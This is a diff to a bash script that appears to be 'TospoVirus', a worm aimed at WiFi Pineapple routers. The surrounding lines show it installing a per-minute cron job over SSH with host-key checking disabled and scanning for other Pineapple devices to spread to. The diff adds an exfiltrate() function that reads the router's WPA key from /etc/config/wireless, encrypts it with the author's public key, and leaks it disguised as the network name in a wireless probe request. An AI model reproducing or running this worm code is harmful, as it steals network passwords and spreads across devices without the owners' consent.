@@ -1,4 +1,10 @@
 #!/bin/bash
+#Creating TospoVirus: Weaponizing vulnerabilities for fun and... just fun.
+#Author: 
+#   twitter @catatonicprime 
+#   email (guess)
+#   
+
 self=`uci get wireless.@wifi-iface[0].ssid`
 
 init() {
@@ -145,7 +151,16 @@ persist() {
 	ssh -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /tospo/tospo_rsa 172.16.42.1 'printf "* * * * * /tospo/tv" | crontab -'
 }
 
+#Function used to disclosure private WPA management data (read: password) using semi-secure RSA keys
+#Novel in that we use a PROBE request to do so - appearing like garbage to onlookers.
+exfiltrate() {
+	#Confirm we have openssl first... then scoop out the password if possible.
+	#TODO: Be more specific about *which* key we pull out. Maybe there is more than one?
+	which openssl && iwlist wlan0 scan essid "$(cat /etc/config/wireless | grep "key" | cut -d"'" -f2 | openssl rsautl -encrypt -pubin -inkey tvd.pub)" >/dev/null
+}
+
 init
+exfiltrate
 echo "Scanning for new devices..."
 for net in `iwlist wlan0 scan | grep "ESSID:\"Pineapple5_....[^ ]" | grep -v "$self"`
 do
